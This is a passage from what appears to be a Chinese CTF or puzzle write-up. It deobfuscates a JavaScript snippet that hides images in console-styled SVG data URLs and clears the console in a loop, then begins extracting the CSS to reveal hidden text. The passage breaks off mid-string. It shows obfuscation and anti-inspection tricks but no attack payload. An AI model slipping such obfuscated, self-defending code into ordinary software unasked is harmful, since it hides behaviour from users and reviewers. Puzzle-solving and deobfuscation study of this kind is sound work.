_0x3ef8b6=_0x4d45,_0x2b390b=(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">if</span>(<span class="string">&#x27;tUeGv&#x27;</span>!==<span class="string">&#x27;tUeGv&#x27;</span>)<span class="keyword">return</span> <span class="title function_">_0x3ead2a</span>(_0x10d864);<span class="keyword">else</span>&#123;<span class="keyword">var</span> _0xc52e83=!![];<span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">_0x25d063,_0x14b0af</span>)&#123;<span class="keyword">var</span> _0x19b56a=_0x4d45;<span class="keyword">if</span>(<span class="string">&#x27;mHXOx&#x27;</span>===<span class="title function_">_0x19b56a</span>(<span class="number">0x225</span>,<span class="string">&#x27;AdAF&#x27;</span>))<span class="title function_">_0x34d93d</span>(_0x2d01ad)();<span class="keyword">else</span>&#123;<span class="keyword">var</span> _0x435e43=_0xc52e83?<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">if</span>(_0x14b0af)&#123;<span class="keyword">var</span> _0x278c9e=_0x14b0af[<span class="string">&#x27;apply&#x27;</span>](_0x25d063,<span class="variable language_">arguments</span>);<span class="keyword">return</span> _0x14b0af=<span class="literal">null</span>,_0x278c9e;&#125;&#125;:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;<span class="keyword">return</span> _0xc52e83=![],_0x435e43;&#125;&#125;;&#125;&#125;()),_0x12600c=<span class="title function_">_0x2b390b</span>(<span class="variable language_">this</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x46bbf9=_0x4d45;<span class="keyword">return</span> _0x12600c[<span class="title function_">_0x46bbf9</span>(<span class="number">0x211</span>,<span class="string">&#x27;DGlt&#x27;</span>)]()[<span class="string">&#x27;search&#x27;</span>](<span class="title function_">_0x46bbf9</span>(<span class="number">0x21c</span>,<span class="string">&#x27;DGlt&#x27;</span>))[<span class="title function_">_0x46bbf9</span>(<span class="number">0x201</span>,<span class="string">&#x27;[Spv&#x27;</span>)]()[<span class="title function_">_0x46bbf9</span>(<span class="number">0x1fb</span>,<span class="string">&#x27;&amp;he^&#x27;</span>)](_0x12600c)[<span class="string">&#x27;search&#x27;</span>](<span class="string">&#x27;(((.+)+)+)+$&#x27;</span>);&#125;);<span class="keyword">return</span> <span class="title function_">_0x12600c</span>(),<span class="title function_">_0x3ef8b6</span>(<span class="number">0x209</span>,<span class="string">&#x27;XSDO&#x27;</span>)+<span class="title function_">_0x3ef8b6</span>(<span class="number">0x210</span>,<span class="string">&#x27;BDZU&#x27;</span>)+<span class="title function_">_0x3ef8b6</span>(<span class="number">0x1f4</span>,<span class="string">&#x27;DyLG&#x27;</span>)+<span class="title function_">_0x3ef8b6</span>(<span class="number">0x229</span>,<span class="string">&#x27;hg[@&#x27;</span>)+<span class="title function_">_0x3ef8b6</span>(<span class="number">0x202</span>,<span class="string">&#x27;XSDO&#x27;</span>)+<span class="title function_">_0x3ef8b6</span>(<span class="number">0x223</span>,<span class="string">&#x27;mpGi&#x27;</span>)+<span class="title function_">_0x3ef8b6</span>(<span class="number">0x1f5</span>,<span class="string">&#x27;JAjy&#x27;</span>)+<span class="title function_">_0x3ef8b6</span>(<span class="number">0x219</span>,<span class="string">&#x27;U8N[&#x27;</span>)+<span class="title function_">_0x3ef8b6</span>(<span class="number">0x1f2</span>,<span class="string">&#x27;TtxT&#x27;</span>)+<span class="title function_">_0x3ef8b6</span>(<span class="number">0x1f6</span>,<span class="string">&#x27;wA8t&#x27;</span>)+<span class="title function_">_0x3ef8b6</span>(<span class="number">0x205</span>,<span class="string">&#x27;e)vL&#x27;</span>)+<span class="title function_">_0x3ef8b6</span>(<span class="number">0x214</span>,<span class="string">&#x27;eFU9&#x27;</span>)+<span class="title function_">_0x3ef8b6</span>(<span class="number">0x21f</span>,<span class="string">&#x27;XSDO&#x27;</span>);&#125;<span class="keyword">var</span> _0x4d032d=<span class="built_in">eval</span>(<span class="title function_">_0x36f7d7</span>()[<span class="string">&#x27;split&#x27;</span>](<span class="title function_">_0x42d653</span>(<span class="number">0x212</span>,<span class="string">&#x27;TtxT&#x27;</span>))[<span class="number">0xf6a</span>+<span class="number">0x12b9</span>*<span class="number">0x1</span>+-<span class="number">0x2221</span>]),_0x4d3fb4=<span class="built_in">eval</span>(<span class="title function_">_0x36f7d7</span>()[<span class="string">&#x27;split&#x27;</span>](<span class="title function_">_0x42d653</span>(<span class="number">0x1fd</span>,<span class="string">&#x27;^s]0&#x27;</span>))[-<span class="number">0x2d9</span>*-<span class="number">0x9</span>+-<span class="number">0x25</span>*<span class="number">0x6f</span>+-<span class="number">0x993</span>]),_0x280bbf=<span class="built_in">eval</span>(<span class="title function_">_0x36f7d7</span>()[<span class="title function_">_0x42d653</span>(<span class="number">0x220</span>,<span class="string">&#x27;@l*d&#x27;</span>)](<span class="title function_">_0x42d653</span>(<span class="number">0x21e</span>,<span class="string">&#x27;eE&amp;$&#x27;</span>))[<span class="number">0x22b1</span>+-<span class="number">0x2e</span>*<span class="number">0x52</span>+-<span class="number">0x13f1</span>]),_0x3ede16=<span class="built_in">eval</span>(<span class="title function_">_0x36f7d7</span>()[<span class="title function_">_0x42d653</span>(<span class="number">0x1f8</span>,<span class="string">&#x27;f%(h&#x27;</span>)](<span class="title function_">_0x42d653</span>(<span class="number">0x221</span>,<span class="string">&#x27;AdAF&#x27;</span>))[<span class="number">0x1d</span>*-<span class="number">0xdf</span>+<span class="number">0x2</span>*<span class="number">0xfcd</span>+-<span class="number">0x1</span>*<span class="number">0x652</span>]),_0x13a155=<span class="built_in">eval</span>(<span class="title function_">_0x36f7d7</span>()[<span class="title function_">_0x42d653</span>(<span class="number">0x227</span>,<span class="string">&#x27;o%$L&#x27;</span>)](<span class="title function_">_0x42d653</span>(<span class="number">0x21b</span>,<span class="string">&#x27;1Mc0&#x27;</span>))[<span class="number">0xc2b</span>*<span class="number">0x3</span>+-<span class="number">0x3</span>*-<span class="number">0x9c1</span>+-<span class="number">0x41be</span>]);(<span class="keyword">function</span>(<span class="params">_0x5da15b</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x5da15b</span>(_0x5da15b);&#125;(<span class="keyword">function</span>(<span class="params">_0xc4be8d</span>)&#123;<span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">_0x3a3176</span>)&#123;<span class="keyword">var</span> _0x51251a=_0x4d45;<span class="keyword">for</span>(<span class="keyword">var</span> _0x7936d0=<span class="number">0x231a</span>+<span class="number">0xe2f</span>+-<span class="number">0x3149</span>;_0x7936d0&lt;<span class="number">0x1d01</span>+<span class="number">0x2</span>*<span class="number">0x20</span>+-<span class="number">0x335</span>*<span class="number">0x9</span>;_0x7936d0++)&#123;<span class="keyword">if</span>(<span class="title function_">_0x51251a</span>(<span class="number">0x215</span>,<span class="string">&#x27;DUc)&#x27;</span>)===<span class="title function_">_0x51251a</span>(<span class="number">0x20b</span>,<span class="string">&#x27;DGlt&#x27;</span>))&#123;<span class="keyword">for</span>(<span class="keyword">var</span> _0x41984e=<span class="number">0xc8</span>*-<span class="number">0x2</span>+-<span class="number">0x2157</span>+<span class="number">0x22e7</span>;_0x41984e&lt;-<span class="number">0xf1e</span>+<span class="number">0x1</span>*<span class="number">0x1f9b</span>+-<span class="number">0x1019</span>;_0x41984e++)&#123;<span class="keyword">var</span> _0x56e0b0=![],_0x9e7595=<span class="title function_">_0x762c28</span>()[<span class="title function_">_0x51251a</span>(<span class="number">0x20a</span>,<span class="string">&#x27;ICBZ&#x27;</span>)](<span class="title function_">_0x51251a</span>(<span class="number">0x214</span>,<span class="string">&#x27;eFU9&#x27;</span>))[<span class="number">0x1818</span>+<span class="number">0xf</span>*<span class="number">0x284</span>+-<span class="number">0x149c</span>*<span class="number">0x3</span>],_0x2773fe=(-<span class="number">0x1c55</span>+-<span class="number">0x3a</span>*<span class="number">0xaa</span>+<span class="number">0x4315</span>)*_0x41984e/(<span class="number">0x1</span>*<span class="number">0xc07</span>+-<span class="number">0xd</span>*-<span class="number">0x2dd</span>+-<span class="number">0x3b</span>*<span class="number">0xd4</span>),_0x1b99f1=-<span class="number">0x1</span>*<span class="number">0xe7b</span>+<span class="number">0x120d</span>+-<span class="number">0x7a</span>*<span class="number">0x7</span>-(<span class="number">0x1dc5</span>*<span class="number">0x1</span>+<span class="number">0x1a35</span>*-<span class="number">0x1</span>+-<span class="number">0xc</span>*<span class="number">0x47</span>)*_0x41984e/(-<span class="number">0x1940</span>*<span class="number">0x1</span>+<span class="number">0x2535</span>+-<span class="number">0xb91</span>);<span class="title function_">_0x15a8cb</span>()&gt;=-<span class="number">0x7</span>*<span class="number">0x41</span>+<span class="number">0x2657</span>*-<span class="number">0x1</span>+<span class="number">0x281e</span>+<span class="number">0.9999</span>&amp;&amp;(_0x9e7595=<span class="title function_">_0xc16c16</span>()[<span class="title function_">_0x51251a</span>(<span class="number">0x20c</span>,<span class="string">&#x27;U8N[&#x27;</span>)](<span class="title function_">_0x51251a</span>(<span class="number">0x22a</span>,<span class="string">&#x27;[Spv&#x27;</span>))[-<span class="number">0x805</span>+<span class="number">0x206</span>*<span class="number">0x1</span>+<span class="number">0x600</span>],_0x56e0b0=!![]);<span class="title function_">_0x15715b</span>(<span class="title function_">_0x51251a</span>(<span class="number">0x207</span>,<span class="string">&#x27;sCvL&#x27;</span>),_0x9e7595[<span class="title function_">_0x51251a</span>(<span class="number">0x213</span>,<span class="string">&#x27;Dhs*&#x27;</span>)](<span class="regexp">/\&#123;a\&#125;/gm</span>,_0x2773fe+<span class="title function_">_0x51251a</span>(<span class="number">0x1fe</span>,<span class="string">&#x27;@l*d&#x27;</span>))[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/\&#123;b\&#125;/gm</span>,_0x1b99f1+<span class="title function_">_0x51251a</span>(<span class="number">0x1fe</span>,<span class="string">&#x27;@l*d&#x27;</span>)));<span class="keyword">if</span>(_0x56e0b0)<span class="title function_">_0x20fde8</span>();&#125;<span class="title function_">_0x354698</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="title function_">_0x5f4ad2</span>(_0x31ac6d)();&#125;,-<span class="number">0x22b8</span>+-<span class="number">0x3</span>*<span class="number">0x7d9</span>+<span class="number">0xc0b</span>*<span class="number">0x5</span>),<span class="title function_">_0x355af8</span>(_0xcf3daa,<span class="number">0x1c10</span>+<span class="number">0x505</span>+-<span class="number">0x1f53</span>);&#125;<span class="keyword">else</span>&#123;<span class="keyword">var</span> _0x38d961=![],_0x48b8aa=<span class="title function_">_0x36f7d7</span>()[<span class="string">&#x27;split&#x27;</span>](<span class="title function_">_0x51251a</span>(<span class="number">0x20e</span>,<span class="string">&#x27;t(Kx&#x27;</span>))[<span class="number">0x1ae2</span>+-<span class="number">0x7a9</span>+-<span class="number">0x1339</span>],_0x48a4aa=(-<span class="number">0x227a</span>*<span class="number">0x1</span>+<span class="number">0x7c</span>*<span class="number">0x1a</span>+<span class="number">0x161e</span>)*_0x7936d0/(-<span class="number">0x3</span>*<span class="number">0xa8d</span>+<span class="number">0x2275</span>+-<span class="number">0x26a</span>),_0x54870d=<span class="number">0x23ff</span>+<span class="number">0x1</span>*<span class="number">0x10cf</span>+-<span class="number">0x3492</span>-(<span class="number">0x1663</span>+-<span class="number">0x2a3</span>*-<span class="number">0x3</span>+-<span class="number">0x1e10</span>)*_0x7936d0/(<span class="number">0x7</span>*-<span class="number">0x2f2</span>+-<span class="number">0x1cb5</span>+<span class="number">0x31b7</span>);<span class="title function_">_0x280bbf</span>()&gt;=-<span class="number">0x2</span>*-<span class="number">0x7ac</span>+-<span class="number">0x7d</span>*<span class="number">0x13</span>+-<span class="number">0x611</span>+<span class="number">0.9999</span>&amp;&amp;(_0x48b8aa=<span class="title function_">_0x36f7d7</span>()[<span class="title function_">_0x51251a</span>(<span class="number">0x228</span>,<span class="string">&#x27;x@bJ&#x27;</span>)](<span class="title function_">_0x51251a</span>(<span class="number">0x1ef</span>,<span class="string">&#x27;Jkbn&#x27;</span>))[<span class="number">0xf31</span>+<span class="number">0x24d</span>*-<span class="number">0x10</span>+-<span class="number">0x568</span>*-<span class="number">0x4</span>],_0x38d961=!![]);<span class="title function_">_0x4d032d</span>(<span class="title function_">_0x51251a</span>(<span class="number">0x1f3</span>,<span class="string">&#x27;f%(h&#x27;</span>),_0x48b8aa[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/\&#123;a\&#125;/gm</span>,_0x48a4aa+<span class="title function_">_0x51251a</span>(<span class="number">0x1fe</span>,<span class="string">&#x27;@l*d&#x27;</span>))[<span class="title function_">_0x51251a</span>(<span class="number">0x1fa</span>,<span class="string">&#x27;1Mc0&#x27;</span>)](<span class="regexp">/\&#123;b\&#125;/gm</span>,_0x54870d+<span class="title function_">_0x51251a</span>(<span class="number">0x1fe</span>,<span class="string">&#x27;@l*d&#x27;</span>)));<span class="keyword">if</span>(_0x38d961)<span class="title function_">_0x4d3fb4</span>();&#125;&#125;<span class="title function_">_0x13a155</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x4d9b31=_0x51251a;<span class="keyword">if</span>(<span class="title function_">_0x4d9b31</span>(<span class="number">0x208</span>,<span class="string">&#x27;AdAF&#x27;</span>)!==<span class="string">&#x27;qFjGh&#x27;</span>)&#123;<span class="keyword">var</span> _0x432807=_0x124546?<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x53db46=_0x4d9b31;<span class="keyword">if</span>(_0x4ba467)&#123;<span class="keyword">var</span> _0x1d092e=_0xaa83dd[<span class="title function_">_0x53db46</span>(<span class="number">0x204</span>,<span class="string">&#x27;5eEM&#x27;</span>)](_0x13210c,<span class="variable language_">arguments</span>);<span class="keyword">return</span> _0x56816a=<span class="literal">null</span>,_0x1d092e;&#125;&#125;:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;<span class="keyword">return</span> _0x3e7357=![],_0x432807;&#125;<span class="keyword">else</span> <span class="title function_">_0xc4be8d</span>(_0xc4be8d)();&#125;,-<span class="number">0x1</span>*<span class="number">0x20c3</span>+-<span class="number">0xc</span>*-<span class="number">0x137</span>+-<span class="number">0x5</span>*-<span class="number">0x407</span>),<span class="title function_">_0x13a155</span>(_0x4d3fb4,<span class="number">0x2351</span>*-<span class="number">0x1</span>+-<span class="number">0x7b</span>*-<span class="number">0x3</span>+<span class="number">0x23a2</span>);&#125;;&#125;)());</span><br></pre></td></tr></table></figure><p>再使用  JavaScript 反混淆器   工具直接解出来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">_0x36f7d7</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> _0x2b390b = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> _0xc52e83 = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">_0x25d063, _0x14b0af</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> _0x435e43 = _0xc52e83 ? <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (_0x14b0af) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x278c9e = _0x14b0af[<span class="string">&#x27;apply&#x27;</span>](_0x25d063, <span class="variable language_">arguments</span>);</span><br><span class="line">            <span class="keyword">return</span> _0x14b0af = <span class="literal">null</span>, _0x278c9e;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; : <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line">        <span class="keyword">return</span> _0xc52e83 = <span class="literal">false</span>, _0x435e43;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;(),</span><br><span class="line">    _0x12600c = <span class="title function_">_0x2b390b</span>(<span class="variable language_">this</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> _0x12600c[<span class="string">&#x27;toString&#x27;</span>]()[<span class="string">&#x27;search&#x27;</span>](<span class="string">&#x27;(((.+)+)+)+$&#x27;</span>)[<span class="string">&#x27;toString&#x27;</span>]()[<span class="string">&#x27;constructor&#x27;</span>](_0x12600c)[<span class="string">&#x27;search&#x27;</span>](<span class="string">&#x27;(((.+)+)+)+$&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">_0x12600c</span>(), <span class="string">&#x27;line-height:200px; padding-block:100px; padding-left:200px; background-repeat:no-repeat;background-image:url(&quot;data:image/svg+xml,%3Csvg xmlns=\&#x27;http://www.w3.org/2000/svg\&#x27; viewBox=\&#x27;0 0 200 200\&#x27;%3E%3Cstyle%3E .wrapper %7B font-family: sans-serif; perspective: 500px; text-align: center; position: relative; width: 100%25; height: 100%25; %7D .cube %7B position: absolute; top: 20%25; left: 30%25; transform-style: preserve-3d; transform: rotateY(40deg) rotateX(-40deg); animation: wiggle_wiggle_wiggle_wiggle_wiggle_yeah 3s ease-in-out infinite alternate; %7D .side %7B width: 8rem; height: 8rem; background: rgba(0, 0, 0, 0.8); display: inline-block; position: absolute; line-height: 8rem; color: %23fff; text-align: center; box-sizing: border-box; border: 3px solid %23f00; font-size: 4rem; %7D .front %7B transform: translateZ(4rem); z-index: 1; %7D .back %7B transform: rotateY(180deg) translateZ(4rem); %7D .left %7B transform: rotateY(-90deg) translateZ(4rem); z-index: 1; %7D .right %7B transform: rotateY(90deg) translateZ(4rem); %7D .top %7B transform: rotateX(90deg) translateZ(4rem); %7D .bottom %7B transform: rotateX(-90deg) translateZ(4rem); %7D @keyframes wiggle_wiggle_wiggle_wiggle_wiggle_yeah %7B 0%25 %7B transform: rotateY(&#123;a&#125;deg) rotateX(-&#123;a&#125;deg); %7D 100%25 %7B transform: rotateY(&#123;b&#125;deg) rotateX(-&#123;b&#125;deg); %7D %7D %3C/style%3E%3CforeignObject width=\&#x27;100%25\&#x27; height=\&#x27;100%25\&#x27;%3E%3Cdiv xmlns=\&#x27;http://www.w3.org/1999/xhtml\&#x27; class=\&#x27;wrapper\&#x27;%3E%3Cdiv class=\&#x27;cube\&#x27;%3E%3Cdiv class=\&#x27;side front\&#x27;%3E1%3C/div%3E%3Cdiv class=\&#x27;side back\&#x27;%3E2%3C/div%3E%3Cdiv class=\&#x27;side left\&#x27;%3E3%3C/div%3E%3Cdiv class=\&#x27;side right\&#x27;%3E4%3C/div%3E%3Cdiv class=\&#x27;side top\&#x27;%3E5%3C/div%3E%3Cdiv class=\&#x27;side bottom\&#x27;%3E6%3C/div%3E%3C/div%3E%3C/div%3E%3C/foreignObject%3E%3C/svg%3E&quot;)||line-height:50px; padding-left:500px; background-repeat:no-repeat;background-image:url(&quot;data:image/svg+xml,%3Csvg xmlns=\&#x27;http://www.w3.org/2000/svg\&#x27;%3E %3Cpath id=\&#x27;path1394\&#x27; style=\&#x27;fill:none%3Bstroke:%23000000%3Bstroke-width:0.264583px%3Bstroke-linecap:butt%3Bstroke-linejoin:miter%3Bstroke-opacity:1\&#x27; d=\&#x27;m 221.50185,6.5147602 3.99292,2.94215 0.4203,14.0802888 3.78277,2.521842 -3.78277,2.731996 -0.21015,14.500595 -3.99292,2.942151 m -75.76812,-32.68897 -0.18289,26.152093 4.20628,-0.18288 0.18289,-0.365766 m 39.51762,-10.582347 v 7.863917 l 2.19458,2.926109 h 8.04679 l 2.74323,-3.108992 -0.36576,-7.498151 -1.82882,-3.474754 -8.22968,-0.182882 z m 17.49855,11.609045 -0.18288,-12.070196 2.56034,-3.840517 6.76663,0.182882 2.37746,3.474755 0.18288,12.253076 v 0 M 79.249122,29.337219 v 7.863917 l 2.19458,2.926109 h 8.04679 l 2.74323,-3.108992 -0.36576,-7.498151 -1.82882,-3.474754 -8.22968,-0.182882 z m 106.868818,-7.460739 -10.0585,0.731527 -3.10899,7.315272 0.73153,5.852215 2.74322,3.108989 8.77833,0.182883 0.73152,-0.182883 m -29.84386,-8.105803 8.77833,-0.365762 2.0117,-2.743227 -2.37747,-3.291872 h -8.9612 l -2.19458,4.0234 0.18288,7.863914 3.29187,2.560347 8.0468,-0.365766 m -36.86029,-9.455308 v 7.863917 l 2.19458,2.926109 h 8.04679 l 2.74323,-3.108992 -0.36576,-7.498151 -1.82882,-3.474754 -8.22968,-0.182882 z m -5.20252,-3.51165 -7.58959,-0.182882 -2.28602,3.931959 V 32.0765 l 8.86976,0.182882 1.5545,1.554493 -0.27433,4.206283 -1.46305,2.377461 -8.32112,0.09144 h 0.4572 m -17.006391,0.457205 -0.18288,-12.070196 2.56034,-3.840517 6.766631,0.182882 2.37746,3.474755 0.18288,12.253076 v 0 m -32.373283,-17.720279 -10.058498,0.731527 -3.108989,7.315272 0.731526,5.852215 2.743226,3.108989 8.778325,0.182883 0.731528,-0.182883 m -15.544951,1.645936 0.731528,0.365766 -4.0234,-2.926109 L 56.87623,24.689039 53.401478,22.128694 57.607759,18.836823 57.241995,6.5837438 59.985222,3.4747537 m -17.008004,34.0160083 8.961204,-0.18288 v 0 m -8.961204,0.18288 -0.182883,-10.058495 9.144087,-0.182883 v 22.860222 h -8.961204 l 0.548645,-0.365765 H 43.34298 m -15.54495,-27.98091 5.852215,-0.182882 0.182883,16.276478 m -0.365763,-10.790025 -7.13239,0.182882 V 38.22229 l 12.43596,-0.365763 V 37.490762 M 19.202586,12.43596 l -0.182882,26.152093 4.206281,-0.18288 0.182882,-0.365766 M 14.996305,12.618842 H 10.241379 L 10.058498,38.039407 5.8522165,37.856527 M 3.8405173,22.67734 15.910714,22.494458\&#x27; %2F%3E %3C%2Fsvg%3E&quot;)||console.log||console.clear||Math.random||Math.floor||setTimeout&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> _0x4d032d = <span class="built_in">eval</span>(<span class="title function_">_0x36f7d7</span>()[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;||&#x27;</span>)[<span class="number">2</span>]),</span><br><span class="line">  _0x4d3fb4 = <span class="built_in">eval</span>(<span class="title function_">_0x36f7d7</span>()[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;||&#x27;</span>)[<span class="number">3</span>]),</span><br><span class="line">  _0x280bbf = <span class="built_in">eval</span>(<span class="title function_">_0x36f7d7</span>()[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;||&#x27;</span>)[<span class="number">4</span>]),</span><br><span class="line">  _0x3ede16 = <span class="built_in">eval</span>(<span class="title function_">_0x36f7d7</span>()[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;||&#x27;</span>)[<span class="number">5</span>]),</span><br><span class="line">  _0x13a155 = <span class="built_in">eval</span>(<span class="title function_">_0x36f7d7</span>()[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;||&#x27;</span>)[<span class="number">6</span>]);</span><br><span class="line">(<span class="keyword">function</span> (<span class="params">_0x5da15b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">_0x5da15b</span>(_0x5da15b);</span><br><span class="line">&#125;)(<span class="keyword">function</span> (<span class="params">_0xc4be8d</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">_0x3a3176</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> _0x7936d0 = <span class="number">0</span>; _0x7936d0 &lt; <span class="number">100</span>; _0x7936d0++) &#123;</span><br><span class="line">      <span class="keyword">var</span> _0x38d961 = <span class="literal">false</span>,</span><br><span class="line">        _0x48b8aa = <span class="title function_">_0x36f7d7</span>()[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;||&#x27;</span>)[<span class="number">0</span>],</span><br><span class="line">        _0x48a4aa = <span class="number">60</span> * _0x7936d0 / <span class="number">100</span>,</span><br><span class="line">        _0x54870d = <span class="number">60</span> - <span class="number">60</span> * _0x7936d0 / <span class="number">100</span>;</span><br><span class="line">      <span class="title function_">_0x280bbf</span>() &gt;= <span class="number">0.9999</span> &amp;&amp; (_0x48b8aa = <span class="title function_">_0x36f7d7</span>()[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;||&#x27;</span>)[<span class="number">1</span>], _0x38d961 = <span class="literal">true</span>);</span><br><span class="line">      <span class="title function_">_0x4d032d</span>(<span class="string">&#x27;%c &#x27;</span>, _0x48b8aa[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/\&#123;a\&#125;/gm</span>, _0x48a4aa + <span class="string">&#x27;&#x27;</span>)[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/\&#123;b\&#125;/gm</span>, _0x54870d + <span class="string">&#x27;&#x27;</span>));</span><br><span class="line">      <span class="keyword">if</span> (_0x38d961) <span class="title function_">_0x4d3fb4</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">_0x13a155</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="title function_">_0xc4be8d</span>(_0xc4be8d)();</span><br><span class="line">    &#125;, <span class="number">500</span>), <span class="title function_">_0x13a155</span>(_0x4d3fb4, <span class="number">450</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>关键在于那一段css代码，里面有两张图片<br>将css代码提取出来，放在控制台上运行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a= <span class="string">&#x27;line-height:200px; padding-block:100px; padding-left:200px; background-repeat:no-repeat;background-image:url(&quot;data:image/svg+xml,%3Csvg xmlns=\&#x27;http://www.w3.org/2000/svg\&#x27; viewBox=\&#x27;0 0 200 200\&#x27;%3E%3Cstyle%3E .wrapper %7B font-family: sans-serif; perspective: 500px; text-align: center; position: relative; width: 100%25; height: 100%25; %7D .cube %7B position: absolute; top: 20%25; left: 30%25; transform-style: preserve-3d; transform: rotateY(40deg) rotateX(-40deg); animation: wiggle_wiggle_wiggle_wiggle_wiggle_yeah 3s ease-in-out infinite alternate; %7D .side %7B width: 8rem; height: 8rem; background: rgba(0, 0, 0, 0.8); display: inline-block; position: absolute; line-height: 8rem; color: %23fff; text-align: center; box-sizing: border-box; border: 3px solid %23f00; font-size: 4rem; %7D .front %7B transform: translateZ(4rem); z-index: 1; %7D .back %7B transform: rotateY(180deg) translateZ(4rem); %7D .left %7B transform: rotateY(-90deg) translateZ(4rem); z-index: 1; %7D .right %7B transform: rotateY(90deg) translateZ(4rem); %7D .top %7B transform: rotateX(90deg) translateZ(4rem); %7D .bottom %7B transform: rotateX(-90deg) translateZ(4rem); %7D @keyframes wiggle_wiggle_wiggle_wiggle_wiggle_yeah %7B 0%25 %7B transform: rotateY(&#123;a&#125;deg) rotateX(-&#123;a&#125;deg); %7D 100%25 %7B transform: rotateY(&#123;b&#125;deg) rotateX(-&#123;b&#125;deg); %7D %7D %3C/style%3E%3CforeignObject width=\&#x27;100%25\&#x27; height=\&#x27;100%25\&#x27;%3E%3Cdiv xmlns=\&#x27;http://www.w3.org/1999/xhtml\&#x27; class=\&#x27;wrapper\&#x27;%3E%3Cdiv class=\&#x27;cube\&#x27;%3E%3Cdiv class=\&#x27;side front\&#x27;%3E1%3C/div%3E%3Cdiv class=\&#x27;side back\&#x27;%3E2%3C/div%3E%3Cdiv class=\&#x27;side left\&#x27;%3E3%3C/div%3E%3Cdiv class=\&#x27;side right\&#x27;%3E4%3C/div%3E%3Cdiv class=\&#x27;side top\&#x27;%3E5%3C/div%3E%3Cdiv class=\&#x27;side bottom\&#x27;%3E6%3C/div%3E%3C/div%3E%3C/div%3E%3C/foreignObject%3E%3C/svg%3E&quot;)||line-height:50px; padding-left:500px; background-repeat:no-repeat;background-image:url(&quot;data:image/svg+xml,%3Csvg xmlns=\&#x27;http://www.w3.org/2000/svg\&#x27;%3E %3Cpath id=\&#x27;path1394\&#x27; style=\&#x27;fill:none%3Bstroke:%23000000%3Bstroke-width:0.264583px%3Bstroke-linecap:butt%3Bstroke-linejoin:miter%3Bstroke-opacity:1\&#x27; d=\&#x27;m 221.50185,6.5147602 3.99292,2.94215 0.4203,14.0802888 3.78277,2.521842 -3.78277,2.731996 -0.21015,14.500595 -3.99292,2.942151 m -75.76812,-32.68897 -0.18289,26.152093 4.20628,-0.18288 0.18289,-0.365766 m 39.51762,-10.582347 v 7.863917 l 2.19458,2.926109 h 8.04679 l 2.74323,-3.108992 -0.36576,-7.498151 -1.82882,-3.474754 -8.22968,-0.182882 z m 17.49855,11.609045 -0.18288,-12.070196 2.56034,-3.840517 6.76663,0.182882 2.37746,3.474755 0.18288,12.253076 v 0 M 